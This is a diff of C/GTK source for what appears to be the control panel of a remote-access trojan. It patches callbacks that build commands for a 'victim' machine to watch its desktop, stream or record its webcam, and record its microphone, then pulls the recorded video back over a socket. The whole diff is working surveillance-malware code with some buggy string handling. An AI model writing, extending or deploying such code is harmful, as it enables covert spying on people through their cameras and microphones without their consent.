@@ -82,7 +82,7 @@ void cb_watch_remote_desktop(GtkButton *button, gpointer user_data)
         return;
     }
 
-    final_victime_cmd = malloc(256 * sizeof(char));
+    final_victime_cmd = malloc(512 * sizeof(char));
     if(final_victime_cmd == NULL)
     {
         error("malloc() final_victim_cmd", "cb_watch_remote_desktop()");
@@ -90,11 +90,11 @@ void cb_watch_remote_desktop(GtkButton *button, gpointer user_data)
     }
 
     final_victime_cmd = strncpy(final_victime_cmd, command_victime_temp, len_cmd);
-    final_victime_cmd = strcat(final_victime_cmd, "host=");
-    final_victime_cmd = strcat(final_victime_cmd, IP);
-    final_victime_cmd = strcat(final_victime_cmd, " ");
-    final_victime_cmd = strcat(final_victime_cmd, "port=");
-    final_victime_cmd = strcat(final_victime_cmd, server_port);
+    final_victime_cmd = strncat(final_victime_cmd, "host=", 6);
+    final_victime_cmd = strncat(final_victime_cmd, IP, 15);
+    final_victime_cmd = strncat(final_victime_cmd, " ", 2);
+    final_victime_cmd = strncat(final_victime_cmd, "port=", 6);
+    final_victime_cmd = strncat(final_victime_cmd, server_port, 5);
 
     gtk_widget_destroy(IP_dialog);
 
@@ -231,7 +231,7 @@ void cb_stream_the_webcam(GtkButton *button, gpointer user_data)
         return;
     }
 
-    final_victime_cmd = malloc(256 * sizeof(char));
+    final_victime_cmd = malloc(512 * sizeof(char));
     if(final_victime_cmd == NULL)
     {
         error("malloc() final_victim_cmd", "cb_stream_the_webcam()");
@@ -239,11 +239,11 @@ void cb_stream_the_webcam(GtkButton *button, gpointer user_data)
     }
 
     final_victime_cmd = strncpy(final_victime_cmd, command_victime_temp, len_cmd);
-    final_victime_cmd = strcat(final_victime_cmd, "host=");
-    final_victime_cmd = strcat(final_victime_cmd, IP);
-    final_victime_cmd = strcat(final_victime_cmd, " ");
-    final_victime_cmd = strcat(final_victime_cmd, "port=");
-    final_victime_cmd = strcat(final_victime_cmd, server_port);
+    final_victime_cmd = strncat(final_victime_cmd, "host=", 6);
+    final_victime_cmd = strncat(final_victime_cmd, IP, 15);
+    final_victime_cmd = strncat(final_victime_cmd, " ", 2);
+    final_victime_cmd = strncat(final_victime_cmd, "port=", 5);
+    final_victime_cmd = strncat(final_victime_cmd, server_port, 5);
 
     gtk_widget_destroy(IP_dialog);
 
@@ -343,6 +343,8 @@ void cb_record_webcam(GtkButton *button, gpointer user_data)
     GtkWidget *number_frames_dialog = NULL;
     const gchar *number_of_frames = NULL;
     GtkWidget *frames_entry = NULL;
+    
+    GtkWidget *recording = NULL;
 
     GtkWidget *too_much_frames_dialog = NULL;
 
@@ -355,13 +357,22 @@ void cb_record_webcam(GtkButton *button, gpointer user_data)
     int err = 0;
     size_t flag_watch = 14;
     
-    unsigned char buffer[BUFSIZ] = "";
+    char *buffer = NULL;
 
     FILE *record = NULL;
     
     long tailleBlockRecut = 0;
     long data_len = 0;
     long totalRcv = 0;
+    
+    GtkWidget *progress_bar_webcam = NULL;
+    GtkWidget *pbar_hbox = NULL;
+    gdouble step_foreward  = 0.0;
+    
+    GtkTextBuffer *text_buffer = NULL;
+    gchar *text = NULL;
+    GtkTextIter start;
+    GtkTextIter end;
 
     //gst-launch-1.0 -v v4l2src device=/dev/video0 num-buffers=500 ! "video/x-raw,width=1440,framerate=30/1" ! videorate ! "video/x-raw,framerate=30/1" ! jpegenc ! avimux ! filesink location=output.avi
 
@@ -380,20 +391,23 @@ void cb_record_webcam(GtkButton *button, gpointer user_data)
     }
 
     number_frames_dialog = gtk_dialog_new_with_buttons("How many frames you want to record ? (500 ~ 1min / max 5000)", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_OK, GTK_RESPONSE_OK, NULL);
-
     gtk_widget_set_size_request(number_frames_dialog, 500, 100);
 
     frames_entry  = gtk_entry_new_with_max_length(8);
-
     gtk_box_pack_start(GTK_BOX(GTK_DIALOG(number_frames_dialog)->vbox), frames_entry, TRUE, FALSE, 0);
 
+    pbar_hbox = gtk_hbox_new(TRUE, 0);
+    progress_bar_webcam = gtk_progress_bar_new();
+    gtk_widget_set_size_request(progress_bar_webcam, 130, 10);
+    
+    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(number_frames_dialog)->vbox), progress_bar_webcam, TRUE, FALSE, 0);
 
     gtk_widget_show_all(GTK_DIALOG(number_frames_dialog)->vbox);
     switch(gtk_dialog_run(GTK_DIALOG(number_frames_dialog)))
     {
         case GTK_RESPONSE_OK:
             number_of_frames = gtk_entry_get_text(GTK_ENTRY(frames_entry));
-            if(atoi(number_of_frames) > 5000)
+            if(atoi(number_of_frames) > 5000 || atoi(number_of_frames) < 1)
             {
                 too_much_frames_dialog = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_WARNING, GTK_BUTTONS_NONE, "You can't record so much frames !");
                 gtk_widget_set_size_request(too_much_frames_dialog, 300, 100);
@@ -405,6 +419,7 @@ void cb_record_webcam(GtkButton *button, gpointer user_data)
                 gtk_widget_destroy(number_frames_dialog);
                 return;
             }
+
             break;
 
         default:
@@ -412,7 +427,7 @@ void cb_record_webcam(GtkButton *button, gpointer user_data)
             return;
     }
 
-    final_victime_cmd = malloc(200 * sizeof(char));
+    final_victime_cmd = malloc(512 * sizeof(char));
     if(final_victime_cmd == NULL)
     {
         error("malloc() final_victim_cmd", "cb_record_webcam()");
@@ -420,12 +435,8 @@ void cb_record_webcam(GtkButton *button, gpointer user_data)
     }
 
     final_victime_cmd = strncpy(final_victime_cmd, command_victime_temp, len_cmd);
-    final_victime_cmd = strcat(final_victime_cmd, number_of_frames);
-    final_victime_cmd = strcat(final_victime_cmd, " ! video/x-raw,width=640,framerate=30/1 ! videorate ! video/x-raw,framerate=30/1 ! jpegenc ! avimux ! filesink location=output.avi");
-
-    gtk_widget_destroy(number_frames_dialog);
-
-    printf("\n\nCommand : %s\n\n", final_victime_cmd);
+    final_victime_cmd = strncat(final_victime_cmd, number_of_frames, strlen(number_of_frames));
+    final_victime_cmd = strncat(final_victime_cmd, " ! video/x-raw,width=640,framerate=30/1 ! videorate ! video/x-raw,framerate=30/1 ! jpegenc ! avimux ! filesink location=output.avi", 132);
 
     len_final_cmd = strlen(final_victime_cmd) + 1;
 
@@ -475,33 +486,75 @@ void cb_record_webcam(GtkButton *button, gpointer user_data)
     record = fopen("output.avi", "wb");
     if(record == NULL)
     {
-        error("fopen() output.avi", "cb_record_micro()");
+        error("fopen() output.avi", "cb_record_webcam()");
         exit(-1);
     }
 
     if(recv(sock, (char*)&data_len, sizeof(data_len), 0) == SOCKET_ERROR)
     {
-        error("recv() data_len", "cb_record_micro()");
+        error("recv() data_len", "cb_record_webcam()");
         exit(-1);
+    }
+    
+    buffer = malloc(data_len * sizeof(char));
+    if(buffer == NULL)
+    {
+        error("malloc buffer", "cb_record_webcam()");
+        return; 
     }
 
     printf("le fichier fait : %ld octets\n\n", data_len);
+    
+    recording = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_INFO, GTK_BUTTONS_NONE, "End of Record ...");
+    gtk_widget_show_all(GTK_DIALOG(recording)->vbox);
+    gtk_dialog_run(GTK_DIALOG(recording));
+    gtk_widget_destroy(recording);
+    
+    
+    gtk_grab_add(progress_bar_webcam);
 
     do
     {
-        tailleBlockRecut = recv(sock, buffer, sizeof(data_len), 0);
+        tailleBlockRecut = recv(sock, buffer, data_len, 0);
 
         fwrite(buffer, sizeof(char), (size_t)tailleBlockRecut, record);
 
         totalRcv += tailleBlockRecut;
 
-        //printf("Dowlading : %.2f Mo\n", (double)totalRcv / 1000000);
+        step_foreward = ((gdouble)totalRcv * 1.0) / (gdouble)data_len;
+
+        if(step_foreward > 1.0)
+            step_foreward = 0.0;
+        
+        gtk_progress_bar_set_fraction(GTK_PROGRESS_BAR(progress_bar_webcam), step_foreward);
+        gtk_main_iteration();
 
     }while(totalRcv < data_len);
+    
+    gtk_grab_remove(progress_bar_webcam);
+    
+    /** Obtaining the buffer associated with the widget. **/
+    text_buffer = gtk_text_view_get_buffer((GtkTextView*)(text_view));
 
-    printf("Reception du fichier video success : %ld !!\n", totalRcv);
+    /** Set the default buffer text. **/
+    gtk_text_buffer_set_text(text_buffer, "Webcam have been recorded ...", -1);
+
+    /** Obtain iters for the start and end of points of the buffer **/
+    gtk_text_buffer_get_start_iter(text_buffer, &start);
+    gtk_text_buffer_get_end_iter(text_buffer, &end);
+
+    /** Get the entire buffer text. **/
+    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);
+
+    /** Print the text **/
+    g_print("%s", text);
+    g_free(text);
+
+    //printf("Reception du fichier video success : %ld !!\n", totalRcv);
 
     free(final_victime_cmd);
+    gtk_widget_destroy(number_frames_dialog);
+    free(buffer);
 
     /* unused parameters */
     (void)button;
@@ -572,7 +625,7 @@ void cb_record_micro(GtkButton *button, gpointer user_data)
     {
         case GTK_RESPONSE_OK:
             time_of_record = gtk_entry_get_text(GTK_ENTRY(time_of_rec_entry));
-            if(atoi(time_of_record) > 60000)
+            if(atoi(time_of_record) > 60000 || atoi(time_of_record) < 1)
             {
                 time_too_long_dialog = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_WARNING, GTK_BUTTONS_NONE, "You can't record so much time !");
                 gtk_widget_set_size_request(time_too_long_dialog, 300, 100);
@@ -609,7 +662,7 @@ void cb_record_micro(GtkButton *button, gpointer user_data)
             return;
     }
     
-    final_victime_cmd = malloc(200 * sizeof(char));
+    final_victime_cmd = malloc(512 * sizeof(char));
     if(final_victime_cmd == NULL)
     {
         error("malloc() final_victim_cmd", "cb_record_webcam()");
